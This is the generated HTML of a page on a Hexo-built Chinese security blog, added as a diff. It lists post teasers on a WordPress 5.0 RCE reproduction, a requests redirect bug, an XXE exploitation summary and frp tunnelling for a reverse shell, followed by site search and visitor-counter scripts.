+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-03T13:27:39+08:00">
+                2019-03-03
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-03-08T09:07:52+08:00">
+                2019-03-08
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/wordpress-5.0-rce-漏洞复现(从环境搭建到代码执行).html" class="leancloud_visitors" data-flag-title="wordpress-5.0-rce-漏洞复现(从环境搭建到代码执行)">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度&#58;</span>
+               
+                 <span class="leancloud-visitors-count">℃</span>
+             </span>
+          
+
+          
+
+          
+
+          
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <blockquote class="blockquote-center">当你觉得很累的时候，说明你正在走上坡路。</blockquote>
+
+<blockquote>
+<p>看了网上大佬们的分析，作为代码审计入门级别的我，看大佬分析都很吃力，很多地方看得稀里糊涂…所以决定动手跟踪下，看下到底怎么触发漏洞，也学习下大佬们的思路，积累些经验。参考了seebug paper <a href="https://paper.seebug.org/822/" title="seebugpaper" target="_blank" rel="noopener">seebugpaper</a>与绿盟的分析<a href="http://blog.nsfocus.net/wordpress-5-0-0-rce/" title="nsfocusblog" target="_blank" rel="noopener">nsfocusblog</a></p>
+</blockquote>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/wordpress-5.0-rce-漏洞复现(从环境搭建到代码执行).html#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+      <div>
+      
+      </div>
+    </div>
+    
+    
+    
+    <div>
+      
+    </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://longofo.cc/requests redirect bug.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Longofo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Longofo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/requests redirect bug.html" itemprop="url">requests redirect bug</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-06T14:25:25+08:00">
+                2019-01-06
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-01-06T15:00:13+08:00">
+                2019-01-06
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/requests redirect bug.html" class="leancloud_visitors" data-flag-title="requests redirect bug">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度&#58;</span>
+               
+                 <span class="leancloud-visitors-count">℃</span>
+             </span>
+          
+
+          
+
+          
+
+          
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <blockquote class="blockquote-center">得之坦然，失之淡然，顺其自然，争其必然</blockquote>
+
+<blockquote>
+<p>fix一个requests redirect bug</p>
+</blockquote>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/requests redirect bug.html#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+      <div>
+      
+      </div>
+    </div>
+    
+    
+    
+    <div>
+      
+    </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://longofo.cc/xxe漏洞利用总结.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Longofo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Longofo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/xxe漏洞利用总结.html" itemprop="url">xxe漏洞利用总结</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-07T16:46:44+08:00">
+                2018-11-07
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2018-11-17T22:23:55+08:00">
+                2018-11-17
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/xxe漏洞利用总结.html" class="leancloud_visitors" data-flag-title="xxe漏洞利用总结">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度&#58;</span>
+               
+                 <span class="leancloud-visitors-count">℃</span>
+             </span>
+          
+
+          
+
+          
+
+          
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <blockquote class="blockquote-center">今天很残酷,明天也一样,后天也许还是一样,但你不得不经过明天后天</blockquote>
+
+<blockquote>
+<p>最近遇到了关于xxe相关漏洞，于是想做个总结，方便以后查阅。</p>
+</blockquote>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/xxe漏洞利用总结.html#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+      <div>
+      
+      </div>
+    </div>
+    
+    
+    
+    <div>
+      
+    </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://longofo.cc/frp实现内网穿透-内网kali接收反弹shell.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Longofo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Longofo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/frp实现内网穿透-内网kali接收反弹shell.html" itemprop="url">frp实现内网穿透-内网kali接收反弹shell</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-08T17:18:00+08:00">
+                2018-09-08
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2018-09-08T19:16:14+08:00">
+                2018-09-08
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/frp实现内网穿透-内网kali接收反弹shell.html" class="leancloud_visitors" data-flag-title="frp实现内网穿透-内网kali接收反弹shell">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度&#58;</span>
+               
+                 <span class="leancloud-visitors-count">℃</span>
+             </span>
+          
+
+          
+
+          
+
+          
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <blockquote class="blockquote-center">总有一段路，需要一个人走，那就一个人，勇敢的走完</blockquote>
+
+<p><img src="/images/frp实现内网穿透-内网kali接收反弹shell-1.png" alt=""></p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/frp实现内网穿透-内网kali接收反弹shell.html#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+      <div>
+      
+      </div>
+    </div>
+    
+    
+    
+    <div>
+      
+    </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+  </section>
+
+  
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
+
+
+          </div>
+          
+
+
+          
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="Longofo" />
+            
+              <p class="site-author-name" itemprop="name">Longofo</p>
+              <p class="site-description motion-element" itemprop="description">小白 | 码渣 | 仰望 | 大佬</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/longofo" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+          
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-globe"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://xiaorui.cc/" title="小瑞" target="_blank">小瑞</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cuiqingcai.com" title="崔庆才(爬虫)" target="_blank">崔庆才(爬虫)</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.leavesongs.com/" title="p牛(安全)" target="_blank">p牛(安全)</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          <div id="music163player">
+    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1319073956&auto=0&height=66"></iframe>
+</div>
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Longofo</span>
+
+  
+</div>
+
+
+  <!--<div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>-->
+
+
+
+  <span class="post-meta-divider"></span>
+
+
+
+  <!--<div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>-->
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("cJGhXiQO1kKYSz7zJLlwMWAA-gzGzoHsz", "L7k9LkIHLSyD7px5x6J8JTnz");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript">
+    //微信二维码点击背景关闭
+    $('body').delegate('.-mob-share-weixin-qrcode-bg','click', function(){
+         $(".-mob-share-weixin-qrcode-close").trigger("click");
+    }); 
+</script>
+
+</body>
+</html>
